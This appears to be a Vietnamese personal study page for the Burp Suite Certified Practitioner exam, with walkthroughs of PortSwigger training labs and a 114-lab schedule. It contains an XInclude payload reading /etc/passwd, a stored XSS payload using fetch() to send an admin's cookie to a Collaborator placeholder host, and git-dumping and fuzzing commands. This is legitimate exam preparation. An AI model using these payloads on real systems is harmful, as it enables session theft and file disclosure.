---
title: "BSCP"
description: "hành trình đến với chiếc cert thứ 2"
slug: "bscp"
menu:
    main:
        weight: 2
        params: 
            icon: user
---


![alt text](image-1.png)

[Làm theo form này](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
# BSCP Lab Schedule — 1 Lab/Ngày

---

## Enumeration 


### Focus Scanning
 

![alt text](image-2.png)
click như trên để scan 
![alt text](image-3.png)
click vào dashboard để thấy được thông tin ; sau đó test bằng payload ở dưới để đọc passwd

![alt text](image-4.png)
Payload : 
```code!
%3cfoo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"%3e%3cxi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/%3e%3c/foo
```

### Scanning non-standard data structures 

#### Bước 1 — Đăng nhập và quan sát session cookie
Đăng nhập với `wiener:peter`. Vào `Proxy` → `HTTP History`, tìm `request GET /my-account?id=wiener`.

Quan sát `cookie session`: Cookie chứa username ở dạng `cleartext`, theo sau là một `token`, phân tách bởi dấu hai chấm (`:`). Điều này gợi ý rằng ứng dụng xử lý giá trị `cookie` như hai input riêng biệt. PortSwigger
Ví dụ cookie trông như:`wiener:abc123tokenxyz`
Mục đích: Nhận ra rằng Burp Scanner mặc định sẽ coi toàn bộ cookie là một giá trị duy nhất, nên không thể phát hiện lỗ hổng nằm ở phần username. **Ta cần chỉ định insertion point thủ công**.

#### Bước 2 — Scan selected insertion point
Chọn (highlight) phần đầu tiên của session cookie — phần cleartext wiener. Click chuột phải chọn "Scan selected insertion point", rồi nhấn OK. PortSwigger
Mục đích: Thay vì scan toàn bộ cookie, ta chỉ đánh dấu phần username làm điểm chèn payload. Đây chính là kỹ thuật cốt lõi của bài lab — khi gặp cấu trúc dữ liệu không chuẩn, Burp Scanner sẽ coi toàn bộ chuỗi như một giá trị duy nhất và chèn payload sai vị trí. Bằng cách tự định nghĩa insertion point, ta có thể scan chính xác từng phần riêng biệt. PortSwigger

#### Bước 3 — Xem kết quả scan
Vào Dashboard, đợi khoảng 1 phút. Burp Scanner sẽ báo cáo một issue Cross-site scripting (stored). PortSwigger
Mở tab Request ở panel phía dưới để xem request mà Burp Scanner đã dùng để phát hiện lỗ hổng. Gửi request này sang Repeater.

#### Bước 4 — Craft payload XSS để lấy cookie admin
Vào tab Collaborator → Copy to clipboard để lấy Burp Collaborator domain.
Trong Repeater, dùng Inspector để xem cookie ở dạng decoded. Thay thế PoC của Burp bằng payload exfiltrate cookie:
```code!
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-TOKEN-PART
```
Lưu ý quan trọng:

Phần trước dấu : → payload XSS (thay thế cho username)
Phần sau dấu : → giữ nguyên session token hiện tại của bạn (không được xóa)
URL encode các ký tự đặc biệt nếu cần (dấu ', ", <, >, backtick)

Mục đích: Khi admin truy cập trang, payload XSS stored sẽ thực thi trong browser của admin, gửi cookie của admin đến Collaborator server của bạn.
![image](https://hackmd.io/_uploads/HJmaNVJp-x.png)

#### Bước 5 — Thu thập cookie admin
Nhấn Apply changes → Send trong Repeater.
Quay lại tab Collaborator, đợi khoảng 1 phút, nhấn `Poll now`. Collaborator server sẽ nhận được các tương tác DNS và HTTP mới PortSwigger — trong đó chứa cookie của admin được encode trong URL path.
Decode URL để lấy giá trị cookie admin.
![image](https://hackmd.io/_uploads/B1DMV4Ja-g.png)

#### Bước 6 — Truy cập admin panel và xóa carlos
Trong browser, mở DevTools (F12) → Application/Storage → Cookies. Thay thế session cookie hiện tại bằng cookie admin vừa lấy được.
Truy cập /admin panel → tìm và xóa user carlos → lab solved.
![image](https://hackmd.io/_uploads/rk0sXEJ6-l.png)

 

## CONTENT DISCOVERY

- [ ] **20/4** — Information disclosure in version control history
### Information disclosure in version control history 
```code!
wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt

ffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ
```
Cái này có vẻ dir của burp ; chỉ cần fuff để lấy thêm path thôi


![alt text](image.png)
Chỉnh sửa như trên để vào discorver ; nó tương tự như fuff l nhưng có vẻ thông minh hơn bới có thể tìm nhiều cấp
![alt text](image-5.png)
[Sau đây là dir mặc định của lab](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt)
![alt text](image-6.png)
Chuyển sang tab control để xem quá trình chạy ; thời gian chạy là khá lâu -> có thể làm việc khác
![alt text](image-7.png)
Sau khi chạy 1 thời gian thì burp sẽ vẽ cho ta 1 site map ; và ta sẽ thấy được có 1 URI khả nghi can leak some value personal information
![alt text](image-8.png)
Sau đó dùng python download về máy with script command : 
```code!
python -m git_dumper https://0af80073046599598378785800c000d3.web-security-academy.net/.git dumped 
```
![alt text](image-9.png)
You can see admin password -> no i am was treated
![alt text](image-10.png)
Using `git log -p --all` to see history commit ; as the result i see actually password : `2e2l5mj2rtdq84xi11a7`
![alt text](image-11.png)
Using this credential to login admin panel
![alt text](image-12.png)
delete carlos to solve this lab

NOTE: always open source code to see some comment of dev ; it can reveal some hidden path or file and it can lead to symphony token deserialization.
---

## SCANNING

- [ ] **21/4** — Discovering vulnerabilities quickly with targeted scanning
- [ ] **22/4** — Scanning non-standard data structures

---

## DOM-XSS

- [ ] **23/4** — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
- [ ] **24/4** — DOM XSS in document.write sink using source location.search inside a select element
- [ ] **25/4** — DOM XSS using web messages and JSON.parse
- [ ] **26/4** — DOM XSS using web messages and a JavaScript URL
- [ ] **27/4** — DOM XSS using web messages
- [ ] **28/4** — Reflected DOM XSS
- [ ] **29/4** — DOM-based cookie manipulation

---

## CROSS SITE SCRIPTING (XSS)

- [ ] **30/4** — Reflected XSS into HTML context with most tags and attributes blocked
- [ ] **1/5** — Reflected XSS with some SVG markup allowed
- [ ] **2/5** — Reflected XSS into HTML context with nothing encoded
- [ ] **3/5** — Reflected XSS into HTML context with all tags blocked except custom ones
- [ ] **4/5** — DOM XSS in jQuery selector sink using a hashchange event
- [ ] **5/5** — Reflected XSS into a JavaScript string with single quote and backslash escaped
- [ ] **6/5** — Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
- [ ] **7/5** — Reflected XSS with AngularJS sandbox escape without strings
- [ ] **8/5** — Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
- [ ] **9/5** — Practice Exam Stage 1 — XSS via JSON into EVAL
- [ ] **10/5** — Exploiting cross-site scripting to steal cookies (Stored XSS)
- [ ] **11/5** — Exploiting DOM clobbering to enable XSS
- [ ] **12/5** — Stored DOM XSS

---

## WEB CACHE POISONING

- [ ] **13/5** — Web cache poisoning with an unkeyed header
- [ ] **14/5** — Web cache poisoning via an unkeyed query parameter
- [ ] **15/5** — Parameter cloaking
- [ ] **16/5** — Web cache poisoning via ambiguous requests
- [ ] **17/5** — Web cache poisoning with multiple headers
- [ ] **18/5** — Web cache poisoning via a fat GET request

---

## HOST HEADERS

- [ ] **19/5** — Password reset poisoning via middle-ware
- [ ] **20/5** — Host validation bypass via connection state attack

---

## HTTP REQUEST SMUGGLING

- [ ] **21/5** — HTTP request smuggling, obfuscating the TE header
- [ ] **22/5** — Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL
- [ ] **23/5** — Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE
- [ ] **24/5** — Exploiting HTTP request smuggling to capture other users' requests
- [ ] **25/5** — Exploiting HTTP request smuggling to deliver reflected XSS
- [ ] **26/5** — HTTP/2 request smuggling via CRLF injection
- [ ] **27/5** — Response queue poisoning via H2.TE request smuggling

---

## BRUTE FORCE

- [ ] **28/5** — Brute-forcing a stay-logged-in cookie
- [ ] **29/5** — Offline password cracking
- [ ] **30/5** — Username enumeration via response timing
- [ ] **31/5** — Username enumeration via subtly different responses
- [ ] **1/6** — Username enumeration via different responses

---

## AUTHENTICATION

- [ ] **2/6** — Inconsistent handling of exceptional input
- [ ] **3/6** — Infinite money logic flaw (Burp Macro)

---

## CSRF — ACCOUNT TAKEOVER

- [ ] **4/6** — Forced OAuth profile linking
- [ ] **5/6** — CSRF with broken Referer validation
- [ ] **6/6** — CSRF where Referer validation depends on header being present
- [ ] **7/6** — CSRF where token is tied to non-session cookie
- [ ] **8/6** — CSRF where token is duplicated in cookie
- [ ] **9/6** — CSRF where token validation depends on token being present
- [ ] **10/6** — CSRF vulnerability with no defences
- [ ] **11/6** — SameSite Strict bypass via sibling domain
- [ ] **12/6** — SameSite Lax bypass via cookie refresh

---

## PASSWORD RESET

- [ ] **13/6** — Password reset broken logic
- [ ] **14/6** — Weak isolation on dual-use endpoint
- [ ] **15/6** — Exploiting time-sensitive vulnerabilities

---

## SQL INJECTION

- [ ] **16/6** — Blind SQL injection with time delays and information retrieval
- [ ] **17/6** — Blind SQL injection with out-of-band data exfiltration
- [ ] **18/6** — Blind SQL injection with out-of-band interaction
- [ ] **19/6** — Blind SQL injection with conditional responses
- [ ] **20/6** — SQL injection attack, listing the database contents on Oracle
- [ ] **21/6** — SQL injection attack, listing the database contents on non-Oracle databases
- [ ] **22/6** — Visible error-based SQL injection
- [ ] **23/6** — SQL injection with filter bypass via XML encoding

---

## JWT

- [ ] **24/6** — JWT authentication bypass via jwk header injection
- [ ] **25/6** — JWT authentication bypass via weak signing key
- [ ] **26/6** — JWT authentication bypass via kid header path traversal
- [ ] **27/6** — JWT authentication bypass via jku header injection

---

## PROTOTYPE POLLUTION

- [ ] **28/6** — Client-side prototype pollution in third-party libraries
- [ ] **29/6** — Privilege escalation via server-side prototype pollution

---

## API TESTING

- [ ] **30/6** — Exploiting a mass assignment vulnerability
- [ ] **1/7** — Exploiting server-side parameter pollution in a query string

---

## ACCESS CONTROL

- [ ] **2/7** — User role can be modified in user profile
- [ ] **3/7** — Authentication bypass via flawed state machine
- [ ] **4/7** — URL-based access control can be circumvented
- [ ] **5/7** — Authentication bypass via information disclosure

---

## GRAPHQL API

- [ ] **6/7** — Finding a hidden GraphQL endpoint
- [ ] **7/7** — Accidental exposure of private GraphQL fields
- [ ] **8/7** — Bypassing GraphQL brute force protections

---

## CORS

- [ ] **9/7** — CORS vulnerability with trusted insecure protocols
- [ ] **10/7** — CORS vulnerability with trusted null origin

---

## XXE INJECTIONS

- [ ] **11/7** — Exploiting XInclude to retrieve files
- [ ] **12/7** — Exploiting blind XXE to exfiltrate data using a malicious external DTD
- [ ] **13/7** — Exploiting blind XXE to retrieve data via error messages
- [ ] **14/7** — SQL injection with filter bypass via XML encoding (XXE + SQLi + HackVertor)
- [ ] **15/7** — Exploiting XXE to perform SSRF attacks
- [ ] **16/7** — Exploiting XXE via image file upload

---

## SSRF

- [ ] **17/7** — SSRF with blacklist-based input filter
- [ ] **18/7** — SSRF via flawed request parsing
- [ ] **19/7** — SSRF via OpenID dynamic client registration
- [ ] **20/7** — Routing-based SSRF
- [ ] **21/7** — SSRF with filter bypass via open redirection vulnerability

---

## SSTI

- [ ] **22/7** — Basic server-side template injection (code context) — Tornado
- [ ] **23/7** — Server-side template injection with information disclosure via user-supplied objects — Django
- [ ] **24/7** — Server-side template injection using documentation — Freemarker
- [ ] **25/7** — Basic server-side template injection — ERB
- [ ] **26/7** — Server-side template injection in an unknown language — Handlebars

---

## SSPP

- [ ] **27/7** — Remote code execution via server-side prototype pollution

---

## FILE PATH TRAVERSAL

- [ ] **28/7** — File path traversal, traversal sequences blocked with absolute path bypass
- [ ] **29/7** — File path traversal, traversal sequences stripped non-recursively
- [ ] **30/7** — File path traversal, traversal sequences stripped with superfluous URL-decode
- [ ] **31/7** — File path traversal, validation of start of path
- [ ] **1/8** — File path traversal, validation of file extension with null byte bypass

---

## FILE UPLOADS

- [ ] **2/8** — Web shell upload via path traversal
- [ ] **3/8** — Web shell upload via obfuscated file extension
- [ ] **4/8** — Remote code execution via polyglot web shell upload
- [ ] **5/8** — Web shell upload via extension blacklist bypass
- [ ] **6/8** — Web shell upload via Content-Type restriction bypass
- [ ] **7/8** — Web shell upload via race condition

---

## DESERIALIZATION

- [ ] **8/8** — Arbitrary object injection in PHP
- [ ] **9/8** — Exploiting Java deserialization with Apache Commons
- [ ] **10/8** — Exploiting PHP deserialization with a pre-built gadget chain

---

## OS COMMAND INJECTION

- [ ] **11/8** — Blind OS command injection with out-of-band data exfiltration
- [ ] **12/8** — Blind OS command injection with output redirection

---

> **Tổng: 114 labs | 20/4 → 12/8 (114 ngày)**